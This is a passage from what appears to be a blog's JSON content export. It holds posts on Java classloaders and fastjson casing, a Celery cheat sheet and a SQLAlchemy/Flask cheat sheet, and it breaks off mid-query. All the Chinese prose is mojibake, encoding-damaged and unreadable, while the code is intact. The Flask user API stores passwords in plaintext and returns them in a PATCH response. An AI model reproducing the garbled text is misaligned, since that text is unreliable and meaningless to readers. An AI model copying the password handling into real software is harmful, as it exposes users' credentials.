â€œ%JAVA_HOME%\\jre\\libâ€ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹é¢åŒ…æ‹¬äº†rt.jar,resource.jar,è¯¥æ–‡ä»¶å¤¹ä¸‹æ‰€æœ‰classæ˜¯ç”±BootStrapClassLoaderåŠ è½½çš„æ‰©å±•ç±»åº“åœ¨%JAVA_HOME%\\jre\\lib\\extç›®å½•ä¸‹ï¼Œè¯¥ç›®å½•ä¸‹çš„ç±»æ˜¯ç”±Extension ClassLoaderæ¥åŠ è½½çš„ä»£ç ä¸ºè¯ public static void main(String[] args) { String property = System.getProperty(&quot;sun.boot.class.path&quot;);//BoostrapClassLoader String[] split = property.split(&quot;;&quot;); Arrays.asList(split).forEach(s -&gt; System.out.println(s)); // jre/lib æ–‡ä»¶å¤¹ä¸‹é¢çš„æ‰€æœ‰ç±» } public static void main(String[] args) { String property = System.getProperty(&quot;java.ext.dirs&quot;);//ExtClassLoader String[] split = property.split(&quot;;&quot;); Arrays.asList(split).forEach(s -&gt; System.out.println(s)); //jre/libä»¥åŠjre/lib/extæ–‡ä»¶å¤¹ä¸‹é¢çš„æ‰€æœ‰ç±»ã€‚è¿™é‡Œé¢å·²ç»çœ‹å‡ºæ¥å§”æ´¾äº† } public static void main(String[] args) { String property = System.getProperty(&quot;java.class.path&quot;);//AppClassLoader String[] split = property.split(&quot;;&quot;); Arrays.asList(split).forEach(s -&gt; System.out.println(s));// è¿™ä¸ªæ‰“å°å‡ºæ¥çš„æ˜¯ä¸Šé¢çš„å¤–åŠ å…¶ä»–ï¼ˆ.ï¼‰ ä¹Ÿæ˜¯åŒäº²å§”æ´¾ } ç°å®ç”Ÿæ´»ä¸­ï¼Œè·‘ä¸€ä¸ªjavaåº”ç”¨éƒ½æ˜¯java -cp xxxéå¸¸é•¿ç”šè‡³å‡ ç™¾ä¸ªjarçš„classpathxxx (å¥½åœ¨ideå¸®å¼€å‘è€…å®Œæˆäº†è¿™ç§å¤„ç†)javaè¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ¥æ”¶çš„å‚æ•° è¿™é‡Œé¢ä»‹ç»äº†ï¼Œæœ‰äº›æ˜¯æ ‡å‡†çš„(æ‰€æœ‰vm implementaionéƒ½æ”¯æŒ)ï¼Œæœ‰äº›æ˜¯éæ ‡å‡†çš„(åªåœ¨hotspot vmä¸Šæ”¯æŒ) jdk bin æ–‡ä»¶å¤¹ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶çš„ä»‹ç» javaçš„å‘½ä»¤è¡Œå‚æ•° fastjsonç­‰jsonåºåˆ—åŒ–ååºåˆ—åŒ–åº“å¯¹äºkeyçš„å¤§å°å†™å¤„ç†ã€‚ï¼ˆfastjsonçš„å¤§å°å†™çš„å‘ï¼‰å…·ä½“æ¥è®²å°±æ˜¯ä¸€ä¸ªAgeçš„fieldåœ¨è¢«åºåˆ—åŒ–ä¹‹åå˜æˆäº†ageçš„stringï¼Œè€Œä¸€ä¸ªageçš„stringå€’æ˜¯å¯ä»¥åè¿‡æ¥åœ¨ååºåˆ—åŒ–å¾—åˆ°Ageã€‚ä¼¼ä¹fastjsoné»˜è®¤ç­–ç•¥æ˜¯fieldé¦–å­—æ¯å°å†™ï¼Œåºåˆ—åŒ–ååºåˆ—åŒ–éƒ½æ˜¯ã€‚ç»“è®ºå°±æ˜¯ï¼Œè·Ÿåå°å•†é‡å¥½ï¼Œæ‰€æœ‰å­—æ®µå°å†™å¼€å¤´(å¬é—»c#æ˜¯å¤§å†™å¼€å¤´)ã€‚åå°ä¸æ”¹çš„è¯ï¼ŒåŠ JSONFieldæ³¨è§£ã€‚è¦æƒ³è®©Ageåºåˆ—åŒ–ä¸ºAgeï¼Œä¸€èˆ¬æ˜¯åœ¨getå’Œsetä¸Šé¢åŠ JSONFieldï¼ŒåŠ åœ¨fieldçš„å®šä¹‰ä¸Šæ²¡æœ‰ç”¨ã€‚ è¿˜åšäº†ä¸€ä¸ªå¥½ç©çš„å°å®éªŒ private static class Customer implements Serializable { private int age; private int Age; private boolean IsRegistered; public int getage() { return age; } public void setage(int age) { this.age= age; } public int getAge() { return Age; } public void setAge(int age) { Age = age; } public boolean isRegistered() { return IsRegistered; } public void setRegistered(boolean registered) { IsRegistered = registered; } } //ç»™ä¸€è¿™ä¹ˆä¸²jsonï¼Œ c2string = &quot;{\\&quot;age\\&quot;:21,\\&quot;Age\\&quot;:22,\\&quot;registered\\&quot;:true}&quot;; è§£æå‡ºæ¥çš„ç»“æœæ˜¯ c2string = &quot;{\\&quot;age\\&quot;:21,\\&quot;Age\\&quot;:22,\\&quot;registered\\&quot;:true}&quot;; Customer c3 = JSON.parseObject(c2string,Customer.class); System.out.println(c3.Age); // 21 ä¼¼ä¹æ˜¯fastjsonæ ¹æ®setXXXåé¢çš„xxxæ‰¾åˆ°äº†Ageè¿™ä¸ªfield System.out.println(c3.age); // 0 System.out.println(c3.IsRegistered); å…¶ä»–çš„jsonåº“ï¼Œgsonæ˜¯æ²¡æœ‰è¿™ä¸ªç°è±¡çš„ autoValueè¿™ä¸ªlibraryçš„ä½¿ç”¨autoValueä¸»è¦æ˜¯ä¸ºäº†åœ¨java 1.6 ä»¥ä¸Šç”Ÿæˆimmutable objectçš„ï¼ŒåŸç†æ˜¯annotaion processorã€‚åœ¨ideaä¸­ä½¿ç”¨çš„è¯ï¼Œéœ€è¦ä¸ºå½“å‰project enable annotation processorã€‚èƒ½å¤Ÿé¿å…æ‰‹åŠ¨å†™java beançš„æ—¶å€™å†™toString, equalsçŠ¯é”™ã€‚å½“ç„¶å¦‚æœä½¿ç”¨çš„æ˜¯kotlinçš„è¯ï¼Œç›´æ¥ä½¿ç”¨data classå°±å¯ä»¥äº†ã€‚è¿˜æä¾›äº†builderæ¨¡å¼ã€‚ Java ç³»ç»Ÿç›‘æ§æœ‰ä¸€ä¸ªå°çš„æŠ€å·§æ˜¯ï¼Œä½ å¯ä»¥ä½¿ç”¨kill -3 å‘ä¸€ä¸ªSIGQUITçš„ä¿¡å·ç»™JVMï¼Œå¯ä»¥æŠŠå †æ ˆä¿¡æ¯ï¼ˆåŒ…æ‹¬åƒåœ¾å›æ”¶çš„ä¿¡æ¯ï¼‰dumpåˆ°stderr/logsã€‚åŸç†æ˜¯jvmåœ¨c++è¿™ä¸€å±‚æ³¨å†Œäº†3çš„ä¿¡å·å¤„ç†handlerï¼Œandroidä¹Ÿæ˜¯è¿™æ ·çš„ å‚è€ƒæœ‰ç›´æ¥å»çœ‹hotspotæºç æ¥åˆ†æçš„classLoader related topics","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"celery-cheetsheet","date":"2018-07-03T08:43:41.000Z","path":"2018/07/03/2018-07-03-celery-cheetsheet/","text":"â€œThere are only two hard things in Computer Science: cache invalidation and naming things.â€â€” Phil Karlton å› ä¸ºéœ€è¦ä½¿ç”¨Redisï¼Œåœ¨ubuntuä¸Šå®‰è£…rediså¯ä»¥ç”¨apt-getï¼Œä¹Ÿèƒ½è‡ªå·±ä¸‹è½½æºç å»makeï¼ˆå‰ææ˜¯å†…å­˜å……è¶³ï¼Œå†…å­˜ä¸è¶³çš„è¯make testä¼šå¤±è´¥ï¼‰ã€‚æ‰€ä»¥æˆ‘å¹²è„†å…³æ‰äº†å‡ ä¸ªæ¯”è¾ƒè€—å†…å­˜çš„è¿›ç¨‹ï¼Œæœ€åç›´æ¥ç”¨apt-getè£…ä¸Šäº†ã€‚ ä¸‹é¢è¿™å‡ æ­¥å°±ç®—æœ€ç®€å•çš„celeryå…¥é—¨äº† from celery import Celery app = Celery(&#39;tasks&#39;, broker=&#39;redis://localhost:6379/0&#39;) @app.task def add(x, y): return x + y celery -A tasks worker â€“loglevel=info &gt;&gt;&gt; from tasks import add &gt;&gt;&gt; add.delay(4, 4) æ³¨æ„ï¼Œwindowsä¸Šcelery4ä¸å®Œå…¨æ”¯æŒcelery-raises-valueerror-not-enough-values-to-unpack åŸºæœ¬çš„é¡¹ç›®ç»“æ„ proj/__init__.py /celery.py /tasks.py proj/celery.py from __future__ import absolute_import, unicode_literals from celery import Celery app = Celery(&#39;proj&#39;, broker=&#39;amqp://&#39;, backend=&#39;amqp://&#39;, include=[&#39;proj.tasks&#39;]) # Optional configuration, see the application user guide. app.conf.update( result_expires=3600, ) if __name__ == &#39;__main__&#39;: app.start() ##è€—æ—¶çš„ä»»åŠ¡éƒ½ä¸¢åˆ°è¿™é‡Œå°±å¥½äº†proj/tasks.py from __future__ import absolute_import, unicode_literals from .celery import app @app.task def add(x, y): return x + y @app.task def mul(x, y): return x * y @app.task def xsum(numbers): return sum(numbers) æ³¨æ„ä¸‹é¢çš„å‘½ä»¤è¦åœ¨projé¡¹ç›®ä¸Šå±‚ç›®å½•ä¸­è¿è¡Œ celery -A proj worker -l info æ‰§è¡Œå¼‚æ­¥æ–¹æ³•ï¼Œè¿™ä¿©éƒ½è¡Œï¼šadd.delay(2, 2)add.apply_async((2, 2)) ##è¿™å¥è¯å¹¶ä¸ä¼šé˜»å¡åœ¨è¿™é‡Œï¼Œåé¢çš„æ–¹æ³•æ¥ç€æ‰§è¡Œï¼Œä¹Ÿå°±è¾¾åˆ°äº†å¼‚æ­¥æ‰§è¡Œçš„ç›®çš„ åœ¨djangoé¡¹ç›®ä¸­ä½¿ç”¨celerydjango-celery-example ç”Ÿäº§ç¯å¢ƒéœ€è¦supervisorå®ˆæŠ¤celery sudo apt-get install supervisor/etc/supervisor/conf.d/something.conf[program:celery]command=/home/deploy/.virtualenvs/my_env/bin/celery â€“app=proj_name worker â€“loglevel=INFOdirectory=/home/deploy/webapps/django_projectuser=user_nameautostart=trueautorestart=trueredirect_stderr=true åˆ·æ–°ä¸€ä¸‹supervisorä»»åŠ¡sudo supervisorctl rereadsudo supervisorctl update ##å¯åŠ¨celerysudo supervisorctl start celery ## å¤±è´¥äº†è‡ªåŠ¨retry from celery import shared_task @shared_task(bind=True, max_retries=3) # you can determine the max_retries here def access_awful_system(self, my_obj_id): from core.models import Object from requests import ConnectionError o = Object.objects.get(pk=my_obj_id) # If ConnectionError try again in 180 seconds try: o.access_awful_system() except ConnectionError as exc: self.retry(exc=exc, countdown=180) # the task goes back to the queue ##é‡è¯•æ—¶é—´æŒ‡æ•°å‹å¢é•¿ä¹Ÿè¡Œ @celery_app.task(max_retries=10) def notify_gcm_device(device_token, message, data=None): notification_json = build_gcm_json(message, data=data) try: gcm.notify_device(device_token, json=notification_json) except ServiceTemporarilyDownError: # Find the number of attempts so far num_retries = notify_gcm_device.request.retries seconds_to_wait = 2.0 ** num_retries # First countdown will be 1.0, then 2.0, 4.0, etc. raise notify_gcm_device.retry(countdown=seconds_to_wait) ## eta åƒcrontabä¸€æ ·å®šæœŸæ‰§è¡Œä»»åŠ¡ from django.utils import timezone from datetime import timedelta now = timezone.now() # later is one hour from now later = now + timedelta(hours=1) access_awful_system.apply_async((object_id), eta=later) åˆ›å»ºå¤šä¸ªqueue# CELERY ROUTES CELERY_ROUTES = { &#39;core.tasks.too_long_task&#39;: {&#39;queue&#39;: &#39;too_long_queue&#39;}, &#39;core.tasks.quick_task&#39;: {&#39;queue&#39;: &#39;quick_queue&#39;}, } # For too long queue celery --app=proj_name worker -Q too_long_queue -c 2 # For quick queue celery --app=proj_name worker -Q quick_queue -c 2 å¯ä»¥subclass taskï¼Œæ¯”å¦‚è‡ªå®šä¹‰ç¼“å­˜ä»€ä¹ˆçš„ class MyTask(celery.Task): ignore_result = False # in case you set it to True globally â€” you should! def __init__(self): # This code is only called once per worker. # Here you can define members, which will be accessible when the task runs, later on. self.cache = {} def run(self, user_id, arg): # Now the task is executing. # We have the â€˜cacheâ€™ at our disposal! return self.normal_operation(user_id, arg) def normal_operation(self, user_id, arg): if (user_id, arg) in self.cache: return self.cache[(user_id, arg)] retval = self.some_value(user_id, arg) self.cache[(user_id, arg)] = retval return retval referencesceleryæœ‰ä¸€ä¸ªç›‘æ§å·¥å…·Flowerasynchronous-tasks-with-django-and-celerymy-experiences-with-a-long-running-celery-based-microprocess","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"sqlalchemyé€ŸæŸ¥æ‰‹å†Œ","date":"2018-07-02T21:12:31.000Z","path":"2018/07/02/2018-07-02-sqlalchemy-cheetsheet/","text":"pip install SQLAlchemy from sqlalchemy import create_engine ## æƒ³ç”¨sqlite? engine = create_engine(&#39;sqlite:///foo.db&#39;, echo=True) ## ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªfoo.dbæ–‡ä»¶ï¼Œè¿™ä¸ªTrueè¡¨ç¤ºç¨‹åºè¿è¡Œçš„æ—¶å€™ä¼šæ‰“å°å‡ºç”Ÿæˆçš„sqlè¯­å¥ã€‚ ## æƒ³ç”¨mysql? engine = create_engine(&#39;mysql+mysqlconnector://%s:%s@localhost:3306/%s?charset=utf8&#39; % (config.DB_USER_NAME,config.DB_PASS_WORD,config.DB_NAME)) ## mysqlä¹Ÿæ˜¯æ”¯æŒçš„ è¿™é‡Œæœ‰ä¸€ä¸ªå‘ï¼š ## mysql://username:password@server/db python3ä¸‹é¢ä¸èƒ½è¿™ä¹ˆå†™ï¼Œè™½ç„¶flask-sqlalchemyæ•™ç¨‹ä¸Šæ˜¯è¿™ä¹ˆæ•™äººçš„ ## mysql+pymysql://username:password@server/db åº”è¯¥è¿™ä¹ˆå†™ï¼Œè¿˜æœ‰pip install PyMySQL ## postgresqlä¹Ÿæ˜¯å¯ä»¥çš„ engine = create_engine(&quot;postgresql://scott:tiger@localhost/test&quot;) åˆ›å»ºdbçš„æ—¶å€™æ³¨æ„,sqliteå› ä¸ºæ˜¯ç›´æ¥å†™æ–‡ä»¶ï¼Œæ‰€ä»¥è¦æŠŠdbçš„è·¯å¾„å†™æ¸…æ¥šäº†ã€‚å¦‚æœè´¸ç„¶å†™ä¸€ä¸ªâ€™sqlite:///db.sqlite3â€™ï¼Œå¯èƒ½ä¼šå‡ºç°no such tableconfig.pyæ–‡ä»¶é‡Œé¢ import os project_dir = os.path.dirname(os.path.abspath(__file__)) SQLALCHEMY_DATABASE_URI = &quot;sqlite:///{}&quot;.format(os.path.join(project_dir, &quot;backend.db&quot;)) æ•°æ®åº“åˆ›å»ºäº†ï¼Œå¼€å§‹å»ºè¡¨è®¾è®¡è¡¨å…¶å®ä¸€èˆ¬æ²¡å¿…è¦è¿™ä¹ˆæï¼Œç›´æ¥db.create_all()å¾—äº† ## create table if not exists engine = create_engine(&quot;sqlite:///myexample.db&quot;) # Access the DB Engine if not engine.dialect.has_table(engine, Variable_tableName): # If table don&#39;t exist, Create. metadata = MetaData(engine) # Create a table with the appropriate Columns ##ä¸»é”®ï¼Œauto_incrementæ˜¯è¿™ä¹ˆè®¾ç½®çš„ Table(Variable_tableName, metadata, Column(&#39;Id&#39;, Integer, primary_key=True, nullable=False,autoincrement = True), Column(&#39;Date&#39;, Date), Column(&#39;Country&#39;, String), Column(&#39;Brand&#39;, String), Column(&#39;Price&#39;, Float), # Implement the creation metadata.create_all() Flaskæ¯”è¾ƒå¥½çš„åœ°æ–¹æ˜¯å¯ä»¥å’ŒSQLAlechemyç´§å¯†ç»“åˆFlaskä¸€èµ·ç”¨ä»£ç å‡ºå¤„ from flask_sqlalchemy import SQLAlchemy from flask import Flask, jsonify, request import configparser app = Flask(__name__) my_config = configparser.ConfigParser() my_config.read(&#39;db.conf&#39;) app.config[&#39;SQLALCHEMY_DATABASE_URI&#39;] = &#39;mysql://&#39; + my_config.get(&#39;DB&#39;, &#39;DB_USER&#39;) + &#39;:&#39; + my_config.get(&#39;DB&#39;, &#39;DB_PASSWORD&#39;) + &#39;@&#39; + my_config.get(&#39;DB&#39;, &#39;DB_HOST&#39;) + &#39;/&#39; + my_config.get(&#39;DB&#39;, &#39;DB_DB&#39;) app.config[&#39;SQLALCHEMY_TRACK_MODIFICATIONS&#39;] = True mydb = SQLAlchemy() mydb.init_app(app) # ç”¨æˆ·æ¨¡å‹ class User(mydb.Model): user_id = mydb.Column(mydb.Integer, primary_key=True) user_name = mydb.Column(mydb.String(60), nullable=False) user_password = mydb.Column(mydb.String(30), nullable=False) user_nickname = mydb.Column(mydb.String(50)) user_email = mydb.Column(mydb.String(30), nullable=False) def __repr__(self): return &#39;&lt;User %r&gt;&#39; % self.user_name # è·å–ç”¨æˆ·åˆ—è¡¨ @app.route(&#39;/users&#39;, methods=[&#39;GET&#39;]) def getUsers(): data = User.query.all() datas = [] for user in data: datas.append({&#39;user_id&#39;: user.user_id, &#39;user_name&#39;: user.user_name, &#39;user_nickname&#39;: user.user_nickname, &#39;user_email&#39;: user.user_email}) return jsonify(data=datas) # æ·»åŠ ç”¨æˆ·æ•°æ® @app.route(&#39;/user&#39;, methods=[&#39;POST&#39;]) def addUser(): user_name = request.form.get(&#39;user_name&#39;) user_password = request.form.get(&#39;user_password&#39;) user_nickname = request.form.get(&#39;user_nickname&#39;) user_email = request.form.get(&#39;user_email&#39;) user = User(user_name=user_name, user_password=user_password, user_nickname=user_nickname, user_email=user_email) try: mydb.session.add(user) mydb.session.commit() except: mydb.session.rollback() mydb.session.flush() userId = user.user_id if (user.user_id is None): result = {&#39;msg&#39;: &#39;æ·»åŠ å¤±è´¥&#39;} return jsonify(data=result) data = User.query.filter_by(user_id=userId).first() result = {&#39;user_id&#39;: user.user_id, &#39;user_name&#39;: user.user_name, &#39;user_nickname&#39;: user.user_nickname, &#39;user_email&#39;: user.user_email} return jsonify(data=result) # è·å–å•æ¡æ•°æ® @app.route(&#39;/user/&lt;int:userId&gt;&#39;, methods=[&#39;GET&#39;]) def getUser(userId): user = User.query.filter_by(user_id=userId).first() if (user is None): result = {&#39;msg&#39;: &#39;æ‰¾ä¸åˆ°æ•°æ®&#39;} else: result = {&#39;user_id&#39;: user.user_id, &#39;user_name&#39;: user.user_name, &#39;user_nickname&#39;: user.user_nickname, &#39;user_email&#39;: user.user_email} return jsonify(data=result) # ä¿®æ”¹ç”¨æˆ·æ•°æ® @app.route(&#39;/user/&lt;int:userId&gt;&#39;, methods=[&#39;PATCH&#39;]) def updateUser(userId): user_name = request.form.get(&#39;user_name&#39;) user_password = request.form.get(&#39;user_password&#39;) user_nickname = request.form.get(&#39;user_nickname&#39;) user_email = request.form.get(&#39;user_email&#39;) try: user = User.query.filter_by(user_id=userId).first() if (user is None): result = {&#39;msg&#39;: &#39;æ‰¾ä¸åˆ°è¦ä¿®æ”¹çš„è®°å½•&#39;} return jsonify(data=result) else: user.user_name = user_name user.user_password = user_password user.user_nickname = user_nickname user.user_email = user_email mydb.session.commit() except: mydb.session.rollback() mydb.session.flush() userId = user.user_id data = User.query.filter_by(user_id=userId).first() result = {&#39;user_id&#39;: user.user_id, &#39;user_name&#39;: user.user_name, &#39;user_password&#39;: user.user_password, &#39;user_nickname&#39;: user.user_nickname, &#39;user_email&#39;: user.user_email} return jsonify(data=result) # åˆ é™¤ç”¨æˆ·æ•°æ® @app.route(&#39;/user/&lt;int:userId&gt;&#39;, methods=[&#39;DELETE&#39;]) def deleteUser(userId): User.query.filter_by(user_id=userId).delete() mydb.session.commit() return getUsers() if __name__ == &#39;__main__&#39;: app.run(debug=True) sclalchemyçš„modelçš„tablenameé»˜è®¤æ˜¯ä¼šæ ¹æ®modelçš„nameç”Ÿæˆå°å†™çš„tablename: For instance the table name is automatically set for you unless overridden. Itâ€™s derived from the class name converted to lowercase and with â€œCamelCaseâ€ converted to â€œcamel_caseâ€. To override the table name, set the tablename class attribute. æ¥çœ‹çœ‹curdçš„ä¸€äº›å¸¸ç”¨çš„åœ°æ–¹,query ApiFlask SQLAlchemy query api &gt;&gt;&gt; peter = User.query.filter_by(username=&#39;peter&#39;).first() &gt;&gt;&gt; peter.id 2 &gt;&gt;&gt; peter.email u&#39;peter@example.org&#39; sqlalchemyè¿™ç§ormä¹Ÿæ˜¯éœ€è¦åŠ é”çš„ sqlalchemy.exc.InvalidRequestError: When initializing mapper Mapper|Newscate|newscate, expression &#39;News&#39; failed to locate a name (&quot;name &#39;News&#39; is not defined&quot;). If this is a class name, consider adding this relationship() to the &lt;class &#39;category.models.Newscate&#39;&gt; class after both dependent classes have been defined. flask-sqlalchemyå…³äºä¸€å¯¹å¤šï¼Œå¤šå¯¹å¤šå…³ç³»çš„è§£é‡ŠæŠ„æ¥çš„model,ä¸€å¯¹å¤šå…³ç³»ï¼Œä¸€ä¸ªUserå¯ä»¥æœ‰å¤šä¸ªNewsï¼Œä¸€ä¸ªNewscategoryå¯ä»¥æœ‰å¤šä¸ªNews from sqlalchemy import Table, MetaData, Column, Integer, String, ForeignKey from database import db as mydb class User(mydb.Model): __tablename__=&quot;t_user&quot; user_id = mydb.Column(mydb.Integer, primary_key=True) user_name = mydb.Column(mydb.String(60), nullable=False) user_password = mydb.Column(mydb.String(30), nullable=False) user_nickname = mydb.Column(mydb.String(50), nullable=False) user_email = mydb.Column(mydb.String(100), nullable=False) newses = mydb.relationship(&#39;News&#39;, backref=&#39;user&#39;, lazy=True) def __repr__(self): return &#39;&lt;User %r&gt;&#39; % self.user_nickname class Newscate(mydb.Model): __tablename__=&quot;t_newscat&quot; cate_id = mydb.Column(mydb.Integer, primary_key=True) cate_name = mydb.Column(mydb.String(50), nullable=False) cate_title = mydb.Column(mydb.String(50), nullable=False) newses = mydb.relationship(&#39;News&#39;, backref=&#39;newscate&#39;, lazy=True) def __repr__(self): return &#39;&lt;Newscate %r&gt;&#39; % self.cate_name class News(mydb.Model): __tablename__=&quot;t_news&quot; news_id = mydb.Column(mydb.Integer, primary_key=True) news_date = mydb.Column(mydb.DateTime, nullable=False) news_content = mydb.Column(mydb.Text, nullable=False) news_title = mydb.Column(mydb.String(100), nullable=False) news_excerpt = mydb.Column(mydb.Text, nullable=False) news_status = mydb.Column(mydb.String(20), nullable=False) news_modified = mydb.Column(mydb.DateTime, nullable=False) news_category = mydb.Column(mydb.Integer, mydb.ForeignKey(&#39;t_newscat.cate_id&#39;), nullable=False) news_author = mydb.Column(mydb.Integer, mydb.ForeignKey(&#39;t_user.user_id&#39;), nullable=False) def __repr__(self): return &#39;&lt;News %r&gt;&#39; % self.news_title å¼€å§‹å»ºè¡¨å§ï¼Œç›´æ¥åœ¨shellé‡Œé¢æè¦å¿«å¾ˆå¤š &gt;&gt;&gt; python from app import app ## è¿™ä¸ªappæ˜¯ä¸€ä¸ªFlaskå®ä¾‹ from database import db from models import News,User,Newscate app.app_context().push() ## è¿™å¥è¯æ˜¯å¿…é¡»çš„[context](http://flask-sqlalchemy.pocoo.org/2.3/contexts/) db.create_all() å¦‚æœåªè¦åˆ›å»ºä¸€å¼ è¡¨çš„è¯å¯ä»¥è¿™ä¹ˆå¹²Model.table.create(session.bind) æ¥çœ‹çœ‹ç”Ÿæˆçš„sqlè¯­å¥ CREATE TABLE t_user ( user_id INTEGER NOT NULL AUTO_INCREMENT, user_name VARCHAR(60) NOT NULL, user_password VARCHAR(30) NOT NULL, user_nickname VARCHAR(50) NOT NULL, user_email VARCHAR(100) NOT NULL, PRIMARY KEY (user_id) ) CREATE TABLE t_newscat ( cate_id INTEGER NOT NULL AUTO_INCREMENT, cate_name VARCHAR(50) NOT NULL, cate_title VARCHAR(50) NOT NULL, PRIMARY KEY (cate_id) ) CREATE TABLE t_news ( news_id INTEGER NOT NULL AUTO_INCREMENT, news_date DATETIME NOT NULL, news_content TEXT NOT NULL, news_title VARCHAR(100) NOT NULL, news_excerpt TEXT NOT NULL, news_status VARCHAR(20) NOT NULL, news_modified DATETIME NOT NULL, news_category INTEGER NOT NULL, news_author INTEGER NOT NULL, PRIMARY KEY (news_id), FOREIGN KEY(news_category) REFERENCES t_newscat (cate_id), FOREIGN KEY(news_author) REFERENCES t_user (user_id) ) ç”Ÿæˆè¡¨ä¹‹åï¼Œå¼€å§‹æ’å…¥æ•°æ®ï¼Œè¿˜æ˜¯åœ¨shellé‡Œé¢ï¼Œå¿«ä¸€ç‚¹ &gt;&gt; User.query.all() [] ##æ•°æ®ä¸ºç©º &gt;&gt;&gt; robin = User(user_name=&quot;Tim&quot;,user_password=&quot;secret&quot;,user_nickname=&quot;tim_nick&quot;,user_email=&quot;lenon@gmail.com&quot;) &gt;&gt;&gt; robin.user_email &#39;lenon@gmail.com&#39; &gt;&gt;&gt; robin.newses ## æ³¨æ„ï¼Œdbä¸­userå¹¶æ²¡æœ‰newsesè¿™ä¸ªcolumn [] &gt;&gt;&gt; robin.user_id &gt;&gt;&gt; ##ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œå› ä¸ºè¿˜æ²¡æœ‰commitåˆ°æ•°æ®åº“ï¼Œé‚£ä¹ˆcommitä¸€ä¸‹ &gt;&gt;&gt; robin.user_id &gt;&gt;&gt; db.session.add(robin) &gt;&gt;&gt; db.session.commit() å†æŸ¥æ‰¾ä¸€ä¸‹ &gt;&gt;&gt; robin.user_id 2018-07-15 10:26:58,358 INFO sqlalchemy.engine.base.Engine BEGIN (implicit) 2018-07-15 10:26:58,358 INFO sqlalchemy.engine.base.Engine SELECT t_user.user_id AS t_user_user_id, t_user.user_name AS t_user_user_name, t_user.user_password AS t_user_user_password, t_user.user_nickname AS t_user_user_nickname, t_user.user_email AS t_user_user_email FROM t_user WHERE t_user.user_id = %(param_1)s 2018-07-15 10:26:58,359 INFO sqlalchemy.engine.base.Engine {&#39;param_1&#39;: 1} &gt;&gt;&gt; 1 ##è¿™å›å°±æœ‰äº† å› ä¸ºnewsä¾èµ–ä¸¤ä¸ªForeign keyï¼Œuserå’Œnewcateï¼Œä¸”éƒ½ä¸ä¸ºç©ºï¼Œæ‰€ä»¥åœ¨åˆ›å»ºNewsä¹‹å‰å¾—å…ˆåˆ›å»ºNewscate &gt;&gt;&gt; breaking_news = Newscate(cate_name=&quot;beaking_news&quot;,cate_title=&quot;breaking News&quot;) &gt;&gt;&gt; breaking_news &lt;Newscate &#39;beaking_news&#39;&gt; &gt;&gt;&gt; breaking_news.cate_title &#39;breaking News&#39; &gt;&gt;&gt;db.session.add(breaking_news) &gt;&gt;&gt;db.session.commit() &gt;&gt;&gt;breaking_news.cate_id 1 ## æŸ¥ä¸‹æ•°æ®åº“ï¼ŒUserå’ŒNewscateé‡Œé¢éƒ½æœ‰æ•°æ®äº† newsitem = News(news_date=datetime.utcnow(),news_content=&quot;content of news item one&quot;,news_title=&quot;title of news item one&quot;,news_excerpt=&quot;excerpt of news item one&quot;,news_status=&quot;normal&quot;,news_modified=datetime.now(),news_category=2,news_author=1) &gt;&gt;&gt; newsitem &lt;News &#39;title of news item one&#39;&gt; &gt;&gt;&gt; db.session.add(newsitem) &gt;&gt;&gt; db.session.commit() 2018-07-15 10:42:11,134 INFO sqlalchemy.engine.base.Engine BEGIN (implicit) 2018-07-15 10:42:11,135 INFO sqlalchemy.engine.base.Engine INSERT INTO t_news (news_date, news_content, news_title, news_excerpt, news_status, news_modified, news_category, news_author) VALUES (%(news_date)s, %(news_content)s, %(news_title)s, %(news_excerpt)s, %(news_status)s, %(news_modified)s, %(news_category)s, %(news_author)s) 2018-07-15 10:42:11,136 INFO sqlalchemy.engine.base.Engine {&#39;news_date&#39;: datetime.datetime(2018, 7, 15, 2, 41, 50, 454505), &#39;news_content&#39;: &#39;content of news item one&#39;, &#39;news_title&#39;: &#39;title of news item one&#39;, &#39;news_excerpt&#39;: &#39;excerpt of news item one&#39;, &#39;news_status&#39;: &#39;normal&#39;, &#39;news_modified&#39;: datetime.datetime(2018, 7, 15, 10, 41, 50, 454505), &#39;news_category&#39;: 2, &#39;news_author&#39;: 1} 2018-07-15 10:42:11,141 INFO sqlalchemy.engine.base.Engine COMMIT æŸ¥ä¸‹æ•°æ®åº“ï¼ŒNewsä¹Ÿæ’å…¥æˆåŠŸ åé¢å¼€å§‹åœ¨guiç•Œé¢ä¸­å¾€æ•°æ®åº“é‡Œé¢æ’å…¥ä¸€äº›æ•°æ®ï¼Œå‡†å¤‡å¥½å‡æ•°æ®ä¹‹åè¦db.session.commit()ä¸€ä¸‹æ‰ä¼šåœ¨sqlalchemyè¿™è¾¹åŒæ­¥ä¸€ä¸‹ã€‚(sessionå¥½åƒä¹Ÿæ²¡æœ‰ä»€ä¹ˆç±»ä¼¼äºsyncçš„api) å¼€å§‹æŸ¥è¯¢ï¼š æ ¹æ®ä¸€ä¸ªNewsidå»æŸ¥æ‰¾è¿™ç¯‡newsçš„user&gt;&gt;&gt; News.query.all()[0].news_author 1 ##æ­£å¸¸å•Šï¼Œè¿™é‡Œå­˜å‚¨çš„å°±æ˜¯userçš„id,ä½†æ˜¯æˆ‘ä»¬æƒ³è¦Userï¼Œè¿˜è®°å¾—ä¸Šé¢å»ºè¡¨çš„æ—¶å€™é‚£ä¸ª&quot;backref&quot;å˜›ï¼Œå†™çš„æ˜¯backref=&#39;user&#39; &gt;&gt;&gt; News.query.all()[0].user &lt;User &#39;tim_nick&#39;&gt; æŸ¥è¯¢æ‰€æœ‰å‘è¡¨è¿‡Newsçš„Userï¼ˆå°±æ˜¯user.newsesä¸ä¸ºç©ºListï¼‰&gt;&gt;&gt; User.query.filter(func.length(User.newses) &gt; 0).all() [&lt;User &#39;tim_nick&#39;&gt;, &lt;User &#39;bounty hounter&#39;&gt;, &lt;User &#39;sally williams&#39;&gt;, &lt;User &#39;john doe&#39;&gt;]æ˜¾ç„¶ä¸æ­£ç¡® è¿™ç§æƒ…å†µçš„ä¸€èˆ¬sqlè¯­å¥åº”è¯¥æ˜¯è¿™ä¹ˆå†™çš„ &gt;&gt;&gt;SELECT t_user.user_id AS t_user_user_id, t_user.user_name AS t_user_user_name, t_user.user_password AS 